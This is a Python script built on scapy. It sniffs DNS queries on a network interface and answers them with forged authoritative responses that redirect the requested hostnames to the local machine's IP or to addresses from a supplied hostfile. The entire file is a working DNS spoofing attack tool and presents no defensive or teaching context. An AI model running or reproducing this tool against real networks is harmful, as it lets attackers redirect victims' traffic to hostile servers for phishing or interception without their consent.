from scapy.all import *
from netifaces import interfaces, ifaddresses, AF_INET
import argparse
import os
import sys
import os.path
def inject_fault(packet):
	global local_ip
	if DNS in packet:
		if not hostfile:
			pass
		elif packet[DNS].qd[0].qname in hostfile:
			#print("found", packet[DNS].qd[0].qname)
			local_ip = hostfile[packet[DNS].qd[0].qname]
		else:
			return
		if packet[DNS].qr == 0 and packet[DNS].qd[0].qtype == 0x1:
			#print("Got  s:",  packet[IP].src, "and dst ", packet[IP].dst, "host port", packet[UDP].sport, "id:", packet[DNS].id)
			spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/\
				UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
				DNS(id=packet[DNS].id, qr=1, aa=1, rd = packet[DNS].rd, ancount=1, qdcount =  packet[DNS].qdcount, qd=packet[DNS].qd,\
				an=DNSRR(rrname=packet[DNS].qd.qname, type=0x1, ttl=10, rclass=0x1, rdata=local_ip))
			#spoofed_packet.show2()
			send(spoofed_packet)


def _load_ips_netifaces():
    import netifaces
    global LOCALHOST
    for iface in netifaces.interfaces():
        ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
        for entry in ipv4s:
            addr = entry.get('addr')
            if not addr:
                continue
            if not (iface.startswith('lo') or addr.startswith('127.')):
                mylocal_ip = addr
            elif not LOCALHOST:
                LOCALHOST = addr
    return str(mylocal_ip)


if __name__ == '__main__':
	parser = argparse.ArgumentParser(add_help=False)
	parser.add_argument('-i')
	parser.add_argument('-h')
	parser.add_argument('expression',nargs="*")
	args = parser.parse_args()
	#print(args)

	if args.i:
		interface = args.i
	else:
		interface = conf.iface

	print("Iface", interface)

	global hostfile
	global local_ip
	hostfile = {}
	if args.h:
		with open(args.h) as fl:
			content = fl.read().splitlines()
		for v in content:
			val, key = v.split()
			hostfile[key+'.'] = val
		print("Hostfile:",hostfile)
	if args.expression:
		str1 = ' '.join(args.expression)
		pkt_filter = str1 + "and udp dst port 53"
	else:
		pkt_filter = "udp dst port 53"
	print("filter", pkt_filter)
	global LOCALHOST
	LOCALHOST=""
	local_ip = _load_ips_netifaces()
	print("local_ip", local_ip)

	sniff(iface=interface, filter=pkt_filter, prn=inject_fault)
